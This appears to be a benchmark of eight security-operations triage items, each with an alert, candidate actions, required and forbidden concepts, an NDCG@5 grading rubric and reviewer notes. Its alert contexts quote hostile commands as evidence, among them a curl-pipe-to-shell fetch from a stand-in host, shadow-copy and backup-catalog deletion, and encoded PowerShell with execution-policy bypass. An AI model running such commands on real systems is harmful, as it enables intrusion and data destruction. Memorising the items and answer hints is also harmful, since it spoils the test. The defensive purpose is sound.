prompt: Rank the top 5 next investigative actions after this endpoint alert. Explain why each ranked action should come before lower-priority options.
context: Alert: EDR detected powershell.exe launched by WINWORD.EXE on FIN-WS-044. Command line includes -NoProfile -ExecutionPolicy Bypass -EncodedCommand. Network telemetry shows a connection to hxxps://cdn-acme-files.example/s/a.js and file creation at C:\Users\l.ramos\AppData\Local\Temp\a.js. Available actions: A1) Decode the PowerShell EncodedCommand and preserve the decoded content. A2) Pull the process tree, parent document metadata, hashes, and script/file creation events from FIN-WS-044. A3) Check proxy/DNS/EDR telemetry for the same URL, host, and file hash across the fleet. A4) Collect volatile endpoint triage artifacts from FIN-WS-044, including running processes, network connections, PowerShell logs, and recent autoruns. A5) Quarantine FIN-WS-044 from the network while preserving EDR access. A6) Immediately wipe and reimage FIN-WS-044. A7) Send a company-wide phishing notification naming l.ramos as compromised. A8) Block all PowerShell execution across the enterprise immediately.

required_concepts.description: The encoded command is primary evidence that can reveal payload, URLs, and follow-on behavior.
Endpoint artifacts establish execution chain, scope, and persistence without destroying evidence.
Searching for the same indicators across telemetry determines whether the alert is isolated or widespread.
Containment is valuable after initial evidence capture and should preserve investigation access.
Wiping early destroys forensic evidence and should not be in the top actions for initial triage.

forbidden_concepts.description: Immediate reimage is destructive and premature before evidence preservation.
A broad notification naming the user is unsupported and can create privacy and operational issues.
A blanket enterprise control is disruptive and unsupported by one early alert.

action_labels.A2: Collect endpoint process and file evidence

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward explanations that prioritize decoding, evidence preservation, endpoint context, and fleet scoping.
Accept variants that swap adjacent evidence-gathering actions before containment.
Penalize ranking reimage, public blame notification, or blanket PowerShell blocking in the top 5.

notes_for_human_reviewer: Attractive but poor actions include immediate reimage and blanket PowerShell blocking. Correct answers should preserve evidence before containment escalation.

prompt: Rank the top 5 next investigative actions after this identity alert. Explain why each ranked action should come before lower-priority options.
context: Alert: Identity provider generated Impossible Travel for user devops.admin. Timeline: 2026-07-04T01:12Z successful MFA push from Singapore ASN; 2026-07-04T01:28Z successful login from Frankfurt VPN exit node; 2026-07-04T01:31Z new OAuth app consent granted: 'BuildMetrics Exporter' scopes Mail.Read offline_access Files.Read.All; 2026-07-04T01:34Z new inbox rule created forwarding messages with subject containing 'invoice' to buildmetrics-reports@example.net. Available actions: A1) Review sign-in logs, device compliance, MFA method used, source IPs, and session IDs for devops.admin. A2) Revoke active sessions and refresh tokens for devops.admin. A3) Inspect and disable suspicious OAuth consent for BuildMetrics Exporter; capture app ID, publisher, scopes, and consent actor. A4) Remove the suspicious inbox forwarding rule after preserving rule metadata. A5) Hunt tenant-wide for the same OAuth app ID, forwarding destination, and anomalous consent events. A6) Reset devops.admin password and require MFA re-registration after evidence capture. A7) Delete the user's mailbox to stop forwarding. A8) Block all logins from Germany permanently. A9) Assume all email was exfiltrated and notify every customer immediately.

required_concepts.description: Initial identity triage should validate the suspicious sessions and authentication context.
The new OAuth consent with offline_access and broad scopes is a high-risk persistence and access vector.
Revoking sessions and refresh tokens limits continued access after identity compromise evidence is collected.
The suspicious inbox rule should be preserved for evidence then removed to stop mail forwarding.
Tenant-wide hunting establishes whether the app or forwarding destination affected other accounts.

forbidden_concepts.description: Deleting the mailbox is destructive and unnecessary for initial containment.
Permanent country blocking is overbroad and unsupported by this evidence alone.
The evidence shows risky access and forwarding, but not confirmed full customer data exfiltration.

action_labels.A2: Revoke active sessions and refresh tokens
action_labels.A3: Inspect and disable suspicious OAuth consent
action_labels.A4: Preserve and remove suspicious inbox rule
action_labels.A5: Tenant-wide hunt for app and forwarding destination
action_labels.A6: Reset password and require MFA re-registration
action_labels.A9: Assume full exfiltration and notify customers

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward prioritizing sign-in validation, OAuth app containment, token revocation, inbox-rule handling, and tenant scoping.
Accept minor ordering variations among A1, A3, A2, and A4 when evidence preservation is explained.
Penalize destructive mailbox deletion, unsupported broad geo-blocks, or premature breach notification claims.

notes_for_human_reviewer: This case tests prioritization around identity compromise with OAuth consent and inbox-rule persistence. Destructive and overbroad actions are intentionally tempting.

prompt: Rank the top 5 next investigative actions after this network alert. Explain why each ranked action should come before lower-priority options.
context: Alert: NDR flagged a workstation with periodic outbound TLS to 203.0.113.88:443 every 60 seconds. Zeek shows JA3 hash 72a589da586844d7f0818ce684948eea, SNI absent, and bytes_out 1500-1700 per beacon. Host inventory maps source 10.30.14.52 to MKT-WS-118. Available actions: A1) Correlate 10.30.14.52 to current hostname/user and DHCP/VPN lease history for the alert window. A2) Pull Zeek/NetFlow history for 203.0.113.88 and JA3 72a589da586844d7f0818ce684948eea across the environment. A3) Query EDR on MKT-WS-118 for processes with network connections to 203.0.113.88 and related command lines. A4) Review DNS, proxy, and TLS metadata around the beacon window for SNI, certificate, and any preceding downloads. A5) Temporarily block or sinkhole 203.0.113.88 after enough evidence is captured for scoping. A6) Take a full packet capture for 30 days before doing anything else. A7) Publish 203.0.113.88 as confirmed malware C2 to external partners immediately. A8) Power off MKT-WS-118 by unplugging it.

required_concepts.description: The source IP must be tied to the correct asset and user for the time window.
Network telemetry can reveal other affected hosts and duration of activity.
Endpoint process context is needed to determine which process generated the beacon.
TLS, DNS, and proxy metadata provide supporting context and possible pivots.
Blocking can be appropriate after capturing enough evidence for scoping and triage.

forbidden_concepts.description: Long passive capture before triage delays containment and scoping.
The evidence is suspicious but does not prove malware C2 or justify external publication.
Hard power-off risks volatile evidence loss and is not the first response here.

action_labels.A1: Map source IP to asset and user
action_labels.A2: Scope destination and JA3 in network telemetry
action_labels.A4: Review DNS proxy and TLS context
action_labels.A5: Block or sinkhole after evidence capture

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward rapid asset mapping, scoping, endpoint correlation, and TLS/proxy context review.
Accept swaps among network and endpoint correlation if the explanation preserves evidence and scope-first logic.
Penalize slow PCAP-only approaches, external C2 overclaims, and hard power-off recommendations.

notes_for_human_reviewer: Tests network-to-endpoint investigation flow and avoids overclaiming suspicious beaconing as confirmed C2.

prompt: Rank the top 5 next investigative actions after this cloud alert. Explain why each ranked action should come before lower-priority options.
context: Alert: AWS GuardDuty reports anomalous API calls from role DataPipelineRole in account 777788889999. CloudTrail shows AssumeRole from i-0abc123pipeline, then ListBuckets, GetObject on 43 objects under s3://finance-quarterly-drafts/, CreateAccessKey for IAM user finance-sync, and PutUserPolicy adding s3:* to finance-sync. Available actions: A1) Preserve CloudTrail, GuardDuty finding JSON, S3 data events, and IAM change events for the incident window. A2) Identify the instance/session that assumed DataPipelineRole and validate whether i-0abc123pipeline is expected to use it. A3) Disable or rotate the newly created access key for finance-sync and capture its key ID and creation time. A4) Remove or roll back the inline PutUserPolicy granting s3:* after recording the policy document. A5) Scope S3 object access by bucket, key prefix, principal, source IP, and user agent. A6) Snapshot and triage i-0abc123pipeline for credential exposure or malicious process activity. A7) Delete the entire finance-quarterly-drafts bucket immediately. A8) Disable the whole AWS account. A9) Publicly disclose a finance breach before validating object sensitivity.

required_concepts.description: Cloud audit artifacts must be preserved before changes remove context or retention windows expire.
The role session and instance source must be validated to determine whether activity is expected or compromised.
The newly created access key is a high-priority persistence risk and should be contained after recording evidence.
The excessive inline policy should be captured then removed to limit privilege expansion.
Object-level scoping determines what data was accessed and by which identity.

forbidden_concepts.description: Deleting the bucket is destructive and not a proper initial triage action.
Disabling the whole account is excessive without broader evidence and may disrupt business operations.
Public disclosure before validating data sensitivity and scope is unsupported.

action_labels.A1: Preserve CloudTrail GuardDuty S3 and IAM evidence
action_labels.A2: Validate assumed role session and instance source
action_labels.A3: Disable or rotate newly created access key
action_labels.A4: Remove or roll back excessive inline policy

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward preserving cloud audit evidence, validating assumed-role context, scoping S3 access, and containing new credentials/policies.
Accept variants that place credential containment before S3 scoping if evidence capture is still addressed.
Penalize bucket deletion, full account shutdown, or premature public breach claims.

notes_for_human_reviewer: Tests cloud triage ordering and distinguishes measured containment from destructive cloud actions.

prompt: Rank the top 5 next investigative actions after this malware-analysis signal. Explain why each ranked action should come before lower-priority options.
context: Alert: Malware sandbox detonated attachment RFQ_4471.iso from a user-submitted phishing email. Sandbox observations: ISO contains RFQ_4471.lnk; lnk launches mshta.exe hxxps://rfq-preview.example/forms/view.hta; mshta spawns powershell.exe; dropped file C:\ProgramData\AdobeSync\adobesvc.dll SHA256 8f2c4c9d7b8a4a0f9b2e2d4033ec1d8c75d6b1b3e1b3f6e8987a5d319a214a77; mutex Global\AdobeSync_4471; outbound TLS to 198.51.100.44. Available actions: A1) Extract and normalize IOCs from the sandbox report, including URL/domain/IP/hash/file path/mutex/process chain. A2) Search email gateway and mailboxes for RFQ_4471.iso, same sender, same subject, attachment hash, and recipients. A3) Hunt EDR for mshta.exe spawning powershell.exe and for the dropped DLL hash/path/mutex. A4) Block or detonate-safelist the malicious URL/domain/IP/hash in security controls after validating no business dependency. A5) Collect the original email headers and attachment from at least one recipient mailbox for preservation. A6) Reverse engineer the DLL fully before any scoping or containment. A7) Delete every ISO file in the company. A8) Reply to the sender to ask if the attachment was malicious.

required_concepts.description: The sandbox report provides several actionable indicators that should be normalized before hunting.
Email telemetry identifies exposed users and spread of the phishing attachment.
Endpoint hunting determines whether sandbox behavior occurred on real hosts.
Original headers and attachment preserve provenance and support sender/infrastructure analysis.
Blocking known malicious indicators is useful after basic validation and scoping.

forbidden_concepts.description: Full reverse engineering is slower and should not block initial scoping and containment.
Deleting all ISO files is broad, destructive, and not tailored to this evidence.
Contacting the sender can tip off an attacker and is not an investigative priority.

action_labels.A3: Hunt EDR for process chain and dropped artifacts
action_labels.A5: Collect original email and attachment evidence

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward extracting IOCs, scoping email exposure, preserving original email, endpoint hunting, and validated blocking.
Accept minor ordering changes among email preservation and EDR hunting.
Penalize delaying all response for full reverse engineering, deleting all ISO files, or contacting the sender.

notes_for_human_reviewer: Tests malware triage prioritization where reverse engineering is useful but not first when scoping and containment are available.

prompt: Rank the top 5 next investigative actions after this endpoint ransomware precursor alert. Explain why each ranked action should come before lower-priority options.
context: Alert: EDR on FS-02 detected vssadmin.exe Delete Shadows /All /Quiet launched by powershell.exe as user ACME\svc-backup. Within 4 minutes, wbadmin.exe DELETE CATALOG -quiet and bcdedit.exe /set {default} recoveryenabled No also ran. No encryption event has been observed yet. Available actions: A1) Isolate FS-02 from the network while preserving EDR and remote response access. A2) Capture process tree, command lines, logged-on sessions, network connections, and recent file modifications from FS-02. A3) Disable or rotate ACME\svc-backup credentials and check where the account is currently logged on. A4) Hunt across servers for vssadmin shadow deletion, wbadmin catalog deletion, bcdedit recovery changes, and same parent process. A5) Verify backup integrity and availability from a management plane not reachable from FS-02. A6) Wait until files are encrypted before escalating. A7) Run a cleanup script that deletes all recently modified files on FS-02. A8) Immediately restore FS-02 from backup over the live system before evidence collection.

required_concepts.description: Ransomware precursor behavior on a file server warrants rapid containment while preserving response access.
Immediate endpoint evidence helps determine origin, scope, and next-hop movement.
The service account context must be contained and scoped across systems.
Similar destructive precursor commands should be searched across server fleet telemetry.
Backup validation is urgent but should avoid using a possibly compromised host path.

forbidden_concepts.description: Waiting for encryption is dangerous and ignores high-confidence precursor activity.
Deleting files can destroy evidence and business data.
Immediate restore over the live system destroys volatile and disk evidence.

action_labels.A2: Capture endpoint process and session evidence
action_labels.A3: Disable or rotate svc-backup and scope logons
action_labels.A4: Hunt destructive precursor commands across servers
action_labels.A5: Verify backup integrity from safe management plane
action_labels.A8: Restore over live system before evidence

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward rapid isolation, evidence capture, service account containment, fleet hunting, and backup validation.
Accept swaps between A2 and A3 when both evidence and identity containment are addressed.
Penalize waiting for encryption, deleting files, or restoring over the system before evidence collection.

notes_for_human_reviewer: Contains destructive precursor commands where containment should be higher priority than lengthy analysis, but evidence preservation still matters.

prompt: Rank the top 5 next investigative actions after this Linux web-server alert. Explain why each ranked action should come before lower-priority options.
context: Alert: WAF blocked several requests to /upload.php with parameter cmd=id from 198.51.100.71. Ten minutes later, EDR on web-07 recorded nginx worker spawning /bin/sh -c 'curl -fsSL hxxps://cdn-img.example/.cache | sh'. A new file /tmp/.nginx-cache was created, and outbound connection to 203.0.113.25:8443 followed. Available actions: A1) Collect web access logs, WAF logs, and relevant request bodies for the source IP and upload.php time window. A2) Query EDR for nginx child processes, shell commands, created files, and outbound connections on web-07. A3) Preserve and hash /tmp/.nginx-cache and capture process/network state before removal. A4) Hunt other web servers for the same URL path, cmd parameter pattern, cdn-img.example, and 203.0.113.25:8443. A5) Temporarily isolate web-07 from outbound internet while maintaining administrative collection access. A6) Delete /var/log/nginx immediately to stop log growth. A7) Patch every internet-facing web server before determining exploit path. A8) Assume the WAF fully blocked the attack and close the case.

required_concepts.description: Web and WAF logs are needed to reconstruct exploit attempts and determine whether any request succeeded.
Endpoint telemetry confirms post-exploitation behavior from the web worker.
The dropped file and volatile state should be preserved before cleanup.
Other web servers may have been targeted or compromised using the same pattern.
Restricting outbound traffic limits callback activity while preserving collection capability.

forbidden_concepts.description: Deleting logs destroys critical evidence.
Patching is important but should not precede basic evidence capture and exploit-path identification.
Endpoint execution shows the attack was not fully blocked.

action_labels.A2: Review EDR process and network evidence
action_labels.A3: Preserve and hash dropped file and volatile state
action_labels.A4: Hunt other web servers for same indicators
action_labels.A5: Restrict outbound internet preserving admin access
action_labels.A7: Patch all web servers before scoping
action_labels.A8: Close case because WAF blocked requests

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions.
Reward collecting web/WAF logs, endpoint process evidence, payload preservation, fleet hunting, and controlled egress containment.
Accept order variations that still capture evidence before cleanup or broad patching.
Penalize deleting logs, assuming WAF success despite endpoint evidence, or patching before basic scoping.

notes_for_human_reviewer: Tests prioritization when WAF and endpoint signals conflict; correct models should not close the case based on blocked requests alone.

prompt: Rank the top 5 next investigative actions after this Kubernetes/registry alert. Explain why each ranked action should come before lower-priority options.
context: Alert: Container registry reports image registry.corp/payments/api:2026.07.08 was pushed by CI token ci-payments-build outside the normal pipeline window. Kubernetes audit logs then show deployment payments-api updated to that digest by system:serviceaccount:ci:deployer. A pod from the new replica set made DNS queries for paste-cache.example and outbound HTTPS to 198.51.100.222. Available actions: A1) Preserve registry push logs, image digest, signer/provenance metadata, and CI job logs for ci-payments-build. A2) Compare the suspicious image digest against the last known-good digest and inspect image layers/package diffs. A3) Review Kubernetes audit logs for who updated the deployment, service account token use, and related rollout events. A4) Roll back payments-api to the last known-good image digest after preserving current pod evidence. A5) Hunt cluster-wide for the same image digest, paste-cache.example, and 198.51.100.222. A6) Rotate or revoke the ci-payments-build token and check recent use across CI and registry. A7) Delete the entire container registry. A8) Kill all pods in all namespaces immediately. A9) Ignore the alert because the deployment was updated by a service account.

required_concepts.description: Registry and CI provenance evidence is central to determining whether the image push was unauthorized.
Comparing image contents and digest establishes what changed in the suspicious artifact.
Kubernetes audit logs explain how the digest reached production and which identity performed the rollout.
Rollback is high priority for containment but should preserve current pod evidence first.
Cluster-wide hunting determines whether the suspicious image or network indicators appear elsewhere.
The CI token used for the unusual push should be contained and its usage scoped.

forbidden_concepts.description: Deleting the registry is destructive and unnecessary for initial response.
Killing all pods is broad, disruptive, and not evidence-based.
Service account use does not prove the deployment was legitimate, especially with suspicious registry timing and network behavior.

action_labels.A1: Preserve registry CI and provenance logs
action_labels.A2: Compare suspicious image to known-good digest
action_labels.A3: Review Kubernetes audit and rollout events
action_labels.A4: Rollback to known-good after preserving pod evidence
action_labels.A5: Hunt cluster-wide for digest and network IOCs
action_labels.A6: Rotate or revoke CI token and scope use
action_labels.A8: Kill all pods in all namespaces

rubric: Score ranked action quality using NDCG@5 against gold_labels.ranked_actions, with partial reasoning credit for placing A6 in the top 5.
Reward supply-chain evidence preservation, image comparison, Kubernetes audit review, controlled rollback, and cluster scoping.
Accept variants that include CI token containment in place of cluster hunting or rollback when justified.
Penalize registry deletion, killing all pods, or assuming service-account activity is benign.

notes_for_human_reviewer: A6 is intentionally high value but not the canonical fifth action in all orderings. Human review should credit well-justified top-5 inclusion of token containment.
